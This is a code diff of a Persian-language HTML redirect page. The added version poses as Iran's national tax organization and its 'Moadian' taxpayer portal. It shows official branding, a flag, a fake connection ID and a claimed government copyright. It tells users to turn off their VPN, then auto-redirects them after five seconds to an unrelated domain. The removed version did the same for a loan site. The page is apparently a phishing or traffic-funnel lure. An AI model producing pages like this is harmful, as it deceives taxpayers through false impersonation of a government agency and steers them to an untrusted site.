@@ -1,144 +1,208 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>در حال انتقال به وام آسان بگیر…</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سامانه مودیان مالیاتی - در حال انتقال</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Tahoma', 'Segoe UI', sans-serif;
+            background-color: #f4f6f8;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
 
-<!-- مقصد -->
-<link rel="canonical" href="https://vam-begir.site" />
-<meta name="robots" content="noindex,nofollow" />
+        /* هدر رسمی بالا */
+        .header {
+            width: 100%;
+            background: white;
+            border-bottom: 4px solid #b59f66; /* رنگ طلایی رسمی */
+            padding: 15px 0;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            text-align: center;
+            margin-bottom: 40px;
+        }
 
-<!-- انتقال خودکار پس از ۵ ثانیه -->
-<meta http-equiv="refresh" content="5;url=https://vam-begir.site" />
+        .header-content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+        }
 
-<style>
-  :root{
-    --bg1:#2b8a3e; --bg2:#1b4d3e; --bg3:#0f2d1a;
-    --btn-main:#2f9e44;
-    --btn-grad1:#4caf50; --btn-grad2:#2f9e44;
-    --text-main:#0d1b2a;
-  }
-  *{box-sizing:border-box;margin:0;padding:0}
-  body{
-    font-family:"Vazirmatn", system-ui, -apple-system, "Segoe UI", Roboto, Tahoma, sans-serif;
-    background: radial-gradient(1200px 800px at 60% -10%, var(--bg1) 0%, var(--bg2) 60%, var(--bg3) 100%);
-    color:#fff;
-    display:flex; flex-direction:column; justify-content:center; align-items:center;
-    height:100vh; text-align:center;
-  }
+        .flag-icon {
+            font-size: 40px; /* پرچم ایران */
+        }
 
-  .card{
-    background:#fff;
-    color:var(--text-main);
-    border-radius:18px;
-    padding:24px 22px;
-    width:min(92vw,520px);
-    box-shadow:0 10px 40px rgba(0,0,0,.2);
-    z-index:2;
-  }
+        .org-title {
+            text-align: right;
+        }
 
-  h1{
-    font-size:20px;
-    font-weight:800;
-    color:var(--btn-main);
-    margin-bottom:10px;
-  }
+        .org-title h2 {
+            margin: 0;
+            font-size: 16px;
+            color: #2c3e50;
+        }
 
-  .slogan{
-    font-size:15px;
-    font-weight:500;
-    color:#333;
-    margin-bottom:16px;
-  }
+        .org-title span {
+            font-size: 12px;
+            color: #7f8c8d;
+        }
 
-  .alert{
-    background:#fff3cd;
-    color:#856404;
-    border:1px solid #ffeeba;
-    border-radius:10px;
-    padding:12px 16px;
-    font-size:14px;
-    text-align:right;
-    margin-bottom:16px;
-    line-height:1.6;
-  }
+        /* باکس اصلی */
+        .card {
+            background-color: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
 
-  .countdown{
-    font-weight:700;
-    font-size:20px;
-    color:#1c7ed6;
-    margin-bottom:14px;
-    animation:pulse 1.2s ease-in-out infinite;
-  }
-  @keyframes pulse{
-    0%,100%{transform:scale(1);opacity:1}
-    50%{transform:scale(1.15);opacity:.8}
-  }
+        h1 {
+            color: #1e3c72;
+            font-size: 18px;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 15px;
+        }
 
-  .btn{
-    display:inline-block;
-    background:linear-gradient(180deg,var(--btn-grad1),var(--btn-grad2));
-    color:#fff;
-    text-decoration:none;
-    font-weight:700;
-    padding:12px 26px;
-    border-radius:10px;
-    box-shadow:0 10px 22px rgba(47,158,68,.35);
-    transition:.3s ease;
-  }
-  .btn:hover{transform:translateY(-2px);box-shadow:0 14px 28px rgba(47,158,68,.4)}
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1e3c72;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
 
-  .hint{
-    font-size:12px;
-    color:#555;
-    margin-top:12px;
-    direction:ltr;
-  }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-  footer{
-    margin-top:20px;
-    font-size:12px;
-    color:rgba(255,255,255,.8);
-  }
-</style>
+        /* کادر هشدار امنیتی */
+        .info-box {
+            background-color: #e8f4fd;
+            border-right: 4px solid #2196f3;
+            color: #0d47a1;
+            padding: 15px;
+            border-radius: 4px;
+            font-size: 13px;
+            line-height: 1.8;
+            text-align: justify;
+            margin: 20px 0;
+        }
+
+        .timer-text {
+            font-size: 16px;
+            color: #444;
+            margin-bottom: 25px;
+        }
+        
+        #timer {
+            color: #d32f2f; /* رنگ قرمز برای تایمر */
+            font-weight: bold;
+            font-size: 20px;
+        }
+
+        .btn {
+            display: block;
+            background: linear-gradient(to left, #1e3c72, #2a5298);
+            color: white;
+            padding: 12px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 14px;
+            transition: opacity 0.3s;
+            cursor: pointer;
+            border: none;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .btn:hover {
+            opacity: 0.9;
+        }
+
+        .footer {
+            margin-top: auto;
+            padding: 20px;
+            font-size: 11px;
+            color: #888;
+            text-align: center;
+            width: 100%;
+            background-color: #eaeaea;
+            border-top: 1px solid #dcdcdc;
+        }
+    </style>
 </head>
 <body>
 
-  <main class="card">
-    <h1>در حال انتقال به سامانه وام آسان بگیر…</h1>
-    <div class="slogan">💸 با وام آسان بگیر، سریع‌تر و مطمئن‌تر به هدفت برس!</div>
-
-    <div class="alert">
-      ⚠️ <strong>توجه:</strong> برای دسترسی صحیح و امن به سامانه، لطفاً VPN یا برنامه‌های تغییر IP خود را غیرفعال کنید.<br>
-      این صفحه بخشی از <strong>شبکه ملی اطلاعات</strong> است و تنها از طریق IP داخلی کشور در دسترس می‌باشد.<br>
-      این اقدام به منظور <strong>حفظ امنیت کاربران و جلوگیری از سرقت حساب‌ها و اطلاعات شخصی</strong> انجام می‌شود.
+    <div class="header">
+        <div class="header-content">
+            <div class="flag-icon">🇮🇷</div>
+            <div class="org-title">
+                <h2>درگاه ملی خدمات الکترونیک</h2>
+                <span>سازمان امور مالیاتی کشور</span>
+            </div>
+        </div>
     </div>
 
-    <div class="countdown">انتقال در <span id="secs">5</span> ثانیه...</div>
-    <a class="btn" href="https://vam-begir.site" rel="noopener noreferrer">رفتن به سامانه</a>
-    <div class="hint">https://vam-begir.site</div>
-  </main>
+    <div class="card">
+        <h1>انتقال به سامانه مودیان</h1>
+        
+        <div class="loader"></div>
 
-  <footer>© 2025 سامانه وام آسان بگیر | همه حقوق محفوظ است</footer>
+        <div class="info-box">
+            <strong>توجه:</strong> مودی گرامی، جهت حفظ امنیت اطلاعات مالیاتی و جلوگیری از سوءاستفاده احتمالی، لطفاً هنگام ورود به سامانه از خاموش بودن فیلترشکن (VPN) خود اطمینان حاصل نمایید.
+            <br>
+            <span style="font-size: 11px; color: #666;">شناسه اتصال: 2904-TRX-IR</span>
+        </div>
 
-<script>
-  const target = "https://vam-begir.site";
-  let seconds = 5;
-  const el = document.getElementById('secs');
+        <div class="timer-text">
+            درحال برقراری ارتباط امن... <br>
+            انتقال خودکار تا <span id="timer">5</span> ثانیه دیگر
+        </div>
 
-  function tick(){
-    el.textContent = seconds;
-    if(seconds <= 0){
-      try { window.location.replace(target); }
-      catch { window.location.href = target; }
-    } else {
-      seconds--;
-      setTimeout(tick, 1000);
-    }
-  }
+        <button onclick="redirectNow()" class="btn">ورود دستی به سامانه</button>
+    </div>
 
-  window.addEventListener('DOMContentLoaded', tick);
-</script>
+    <div class="footer">
+        تمامی حقوق این درگاه متعلق به سازمان امور مالیاتی کشور می‌باشد. © ۱۴۰۳
+    </div>
+
+    <script>
+        // ********************************************
+        // لینک مقصد با HTTPS فعال
+        // ********************************************
+        const destinationURL = "https://کلیک-شود.بازار"; 
+
+        let timeLeft = 5;
+        const timerElement = document.getElementById('timer');
+        
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerElement.innerText = timeLeft;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                redirectNow();
+            }
+        }, 1000);
+
+        function redirectNow() {
+            window.location.href = destinationURL;
+        }
+    </script>
+
 </body>
 </html>
